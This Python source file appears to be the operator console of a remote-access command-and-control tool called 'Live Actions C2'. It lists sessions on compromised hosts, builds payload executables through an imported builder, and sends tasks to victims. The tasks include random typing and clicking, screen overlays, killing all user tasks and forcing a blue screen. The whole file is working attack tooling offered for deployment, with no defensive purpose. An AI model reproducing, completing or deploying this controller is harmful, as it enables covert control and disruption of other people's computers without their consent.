import customtkinter as ctk
from tkinter import filedialog, messagebox
import requests
import threading
import time
from builder import build_payload

C2_SERVER_URL = "http://127.0.0.1:5003" # Replace with your Render URL when deploying

class App(ctk.CTk):
    def __init__(self):
        super().__init__()
        self.title("Live Actions C2"); self.geometry("1024x700")
        self.grid_columnconfigure(0, weight=1); self.grid_rowconfigure(1, weight=1)
        self.sessions = {}; self.session_widgets = {}; self.active_session_id = None
        self.home_frame = ctk.CTkFrame(self, fg_color="transparent")
        self.home_frame.grid(row=0, column=0, rowspan=2, sticky="nsew")
        self.home_frame.grid_columnconfigure(0, weight=1); self.home_frame.grid_rowconfigure(2, weight=1)
        self.session_detail_frame = ctk.CTkFrame(self, fg_color="transparent")
        self.setup_home_frame_widgets(); self.start_polling()

    def setup_home_frame_widgets(self):
        builder_frame = ctk.CTkFrame(self.home_frame)
        builder_frame.grid(row=0, column=0, padx=10, pady=10, sticky="ew")
        self.payload_name_entry = ctk.CTkEntry(builder_frame, placeholder_text="payload_name")
        self.payload_name_entry.pack(side="left", fill="x", expand=True, padx=5, pady=5)
        self.build_button = ctk.CTkButton(builder_frame, text="Build Payload", command=self.build_payload_handler)
        self.build_button.pack(side="left", padx=5, pady=5)
        self.sessions_label = ctk.CTkLabel(self.home_frame, text="Active Sessions (0)", font=ctk.CTkFont(weight="bold"))
        self.sessions_label.grid(row=1, column=0, padx=10, pady=(10, 0))
        self.sessions_frame = ctk.CTkScrollableFrame(self.home_frame, corner_radius=0)
        self.sessions_frame.grid(row=2, column=0, padx=10, pady=(0, 10), sticky="nsew")

    def start_polling(self):
        self.polling_active = True
        self.poll_thread = threading.Thread(target=self.poll_for_sessions, daemon=True)
        self.poll_thread.start()
        self.protocol("WM_DELETE_WINDOW", self.on_closing)

    def show_home_view(self):
        self.active_session_id = None; self.session_detail_frame.grid_forget()
        self.home_frame.grid(row=0, column=0, rowspan=2, sticky="nsew")

    def show_session_detail_view(self, session_id):
        self.active_session_id = session_id
        session_data = self.sessions.get(session_id)
        if not session_data: return
        self.home_frame.grid_forget()
        for widget in self.session_detail_frame.winfo_children(): widget.destroy()
        self.session_detail_frame.grid(row=0, column=0, rowspan=2, sticky="nsew", padx=10, pady=10)
        self.session_detail_frame.grid_columnconfigure(0, weight=1); self.session_detail_frame.grid_rowconfigure(1, weight=1)
        header_frame = ctk.CTkFrame(self.session_detail_frame, fg_color="transparent")
        header_frame.grid(row=0, column=0, sticky="ew", pady=(0, 10))
        ctk.CTkButton(header_frame, text="< Back to Sessions", command=self.show_home_view).pack(side="left")
        ctk.CTkLabel(header_frame, text=f"Controlling: {session_data.get('hostname', 'N/A')}", font=ctk.CTkFont(size=16, weight="bold")).pack(side="left", padx=20)
        control_panel = ctk.CTkScrollableFrame(self.session_detail_frame)
        control_panel.grid(row=1, column=0, sticky="nsew")
        self.populate_control_panel(control_panel, session_id)

    def populate_control_panel(self, parent, session_id):
        custom_frame = ctk.CTkFrame(parent); custom_frame.pack(fill="x", padx=10, pady=5)
        custom_frame.grid_columnconfigure(1, weight=1)
        ctk.CTkLabel(custom_frame, text="Custom Actions", font=ctk.CTkFont(weight="bold")).grid(row=0, column=0, columnspan=3, pady=5)
        popup_title_entry = ctk.CTkEntry(custom_frame, placeholder_text="Notification Title"); popup_title_entry.grid(row=1, column=0, padx=5, pady=2)
        popup_msg_entry = ctk.CTkEntry(custom_frame, placeholder_text="Notification Message..."); popup_msg_entry.grid(row=1, column=1, padx=5, pady=2, sticky="ew")
        ctk.CTkButton(custom_frame, text="Send Notification", command=lambda: self.send_task("show_popup", {"title": popup_title_entry.get(), "message": popup_msg_entry.get()})).grid(row=1, column=2, padx=5, pady=2)
        site_entry = ctk.CTkEntry(custom_frame, placeholder_text="https://example.com"); site_entry.grid(row=2, column=0, columnspan=2, padx=5, pady=5, sticky="ew")
        ctk.CTkButton(custom_frame, text="Launch Website", command=lambda: self.send_task("open_website", {"url": site_entry.get()})).grid(row=2, column=2, padx=5, pady=5)

        annoy_frame = ctk.CTkFrame(parent); annoy_frame.pack(fill="x", padx=10, pady=5)
        ctk.CTkLabel(annoy_frame, text="Annoyance & Pranks", font=ctk.CTkFont(weight="bold")).pack(anchor="w", padx=5, pady=5)
        btn_frame1 = ctk.CTkFrame(annoy_frame, fg_color="transparent"); btn_frame1.pack(fill="x")
        ctk.CTkButton(btn_frame1, text="Toggle Noise", command=lambda: self.send_task("toggle_noise")).pack(side="left", padx=5, pady=5)
        ctk.CTkButton(btn_frame1, text="Toggle Caps Lock Spam", command=lambda: self.send_task("toggle_caps_lock_spam")).pack(side="left", padx=5, pady=5)
        ctk.CTkButton(btn_frame1, text="Toggle USB Spam", command=lambda: self.send_task("toggle_usb_spam")).pack(side="left", padx=5, pady=5)
        ctk.CTkButton(btn_frame1, text="Open/Close CD Tray", command=lambda: self.send_task("open_cd_tray")).pack(side="left", padx=5, pady=5)
        btn_frame2 = ctk.CTkFrame(annoy_frame, fg_color="transparent"); btn_frame2.pack(fill="x")
        ctk.CTkButton(btn_frame2, text="Toggle Random Clicking", command=lambda: self.send_task("toggle_random_clicking")).pack(side="left", padx=5, pady=5)
        ctk.CTkButton(btn_frame2, text="Toggle Random Typing", command=lambda: self.send_task("toggle_random_typing")).pack(side="left", padx=5, pady=5)

        visual_frame = ctk.CTkFrame(parent); visual_frame.pack(fill="x", padx=10, pady=5)
        ctk.CTkLabel(visual_frame, text="Visuals", font=ctk.CTkFont(weight="bold")).pack(anchor="w", padx=5, pady=5)
        ctk.CTkButton(visual_frame, text="Toggle Desktop Icons", command=lambda: self.send_task("toggle_desktop_icons")).pack(side="left", padx=5, pady=5)
        overlay_color_menu = ctk.CTkOptionMenu(visual_frame, values=["Black", "Red", "Blue", "Green", "White"]); overlay_color_menu.pack(side="left", padx=5, pady=5)
        alpha_slider = ctk.CTkSlider(visual_frame, from_=0.1, to=1.0); alpha_slider.pack(side="left", padx=5, pady=5, expand=True, fill="x"); alpha_slider.set(0.5)
        def send_overlay_task(): self.send_task("toggle_overlay", {"color": overlay_color_menu.get().lower(), "alpha": alpha_slider.get()})
        ctk.CTkButton(visual_frame, text="Toggle Overlay", command=send_overlay_task).pack(side="left", padx=5, pady=5)
        ctk.CTkButton(visual_frame, text="Hide Overlay", fg_color="darkred", hover_color="#500", command=lambda: self.send_task("hide_overlay")).pack(side="left", padx=5, pady=5)

        destructive_frame = ctk.CTkFrame(parent, fg_color="#2b2121"); destructive_frame.pack(fill="x", padx=10, pady=10)
        ctk.CTkLabel(destructive_frame, text="System & Destructive Actions (Use With Caution)", font=ctk.CTkFont(weight="bold"), text_color="#f0c0c0").pack(anchor="w", padx=5, pady=5)
        ctk.CTkButton(destructive_frame, text="Fake Shutdown", command=lambda: self.send_task("fake_shutdown")).pack(side="left", padx=5, pady=5)
        ctk.CTkButton(destructive_frame, text="Kill All User Tasks", command=lambda: self.send_task("kill_tasks")).pack(side="left", padx=5, pady=5)
        ctk.CTkButton(destructive_frame, text="BSOD (Admin Required)", fg_color="darkred", hover_color="#500", command=lambda: self.send_task("bsod")).pack(side="left", padx=5, pady=5)

    def send_task(self, command, args={}):
        if not self.active_session_id: messagebox.showwarning("Warning", "No active session selected."); return
        task_payload = {"session_id": self.active_session_id, "command": command, "args": args}
        try:
            requests.post(f"{C2_SERVER_URL}/api/task", json=task_payload, timeout=10).raise_for_status()
            print(f"Task '{command}' sent successfully.")
        except requests.exceptions.RequestException as e: messagebox.showerror("Error", f"Failed to send task: {e}")

    def on_closing(self): self.polling_active = False; self.destroy()

    def poll_for_sessions(self):
        while self.polling_active:
            try:
                response = requests.get(f"{C2_SERVER_URL}/api/get_sessions", timeout=10)
                if response.status_code == 200:
                    self.after(0, self.update_gui_with_sessions, response.json())
            except requests.exceptions.RequestException: pass
            time.sleep(5)

    def update_gui_with_sessions(self, server_sessions):
        self.sessions_label.configure(text=f"Active Sessions ({len(server_sessions)})")
        current_session_ids = {s["session_id"] for s in server_sessions}
        for session_data in server_sessions:
            sid = session_data["session_id"]
            if sid not in self.sessions:
                self.sessions[sid] = session_data
                self.add_session_widget(sid, session_data["hostname"])
            is_active = (time.time() - session_data.get("last_seen", 0)) < 30
            if sid in self.session_widgets: self.session_widgets[sid].configure(fg_color="green" if is_active else "orange")
        for sid in list(self.sessions.keys()):
            if sid not in current_session_ids:
                if sid in self.session_widgets: self.session_widgets[sid].destroy()
                if sid in self.sessions: del self.sessions[sid]
                if sid in self.session_widgets: del self.session_widgets[sid]

    def add_session_widget(self, session_id, hostname):
        button = ctk.CTkButton(self.sessions_frame, text=f"{hostname}", command=lambda s=session_id: self.show_session_detail_view(s))
        button.pack(fill="x", padx=5, pady=2)
        self.session_widgets[session_id] = button

    def build_payload_handler(self):
        payload_name = self.payload_name_entry.get()
        if not payload_name: messagebox.showerror("Error", "Payload name cannot be empty."); return
        output_dir = filedialog.askdirectory(title="Select Save Directory")
        if not output_dir: return
        self.build_button.configure(state="disabled", text="Building...")
        self.update_idletasks()
        threading.Thread(target=self._run_build, args=(C2_SERVER_URL, output_dir, payload_name), daemon=True).start()

    def _run_build(self, c2_url, output_dir, payload_name):
        success = build_payload(c2_url=c2_url, output_dir=output_dir, payload_name=payload_name)
        self.after(0, lambda: self.on_build_complete(success, payload_name))

    def on_build_complete(self, success, payload_name):
        if success: messagebox.showinfo("Success", f"Payload '{payload_name}.exe' built!")
        else: messagebox.showerror("Build Failed", "Check console for details.")
        self.build_button.configure(state="normal", text="Build Payload")

if __name__ == "__main__":
    app = App()
    app.mainloop()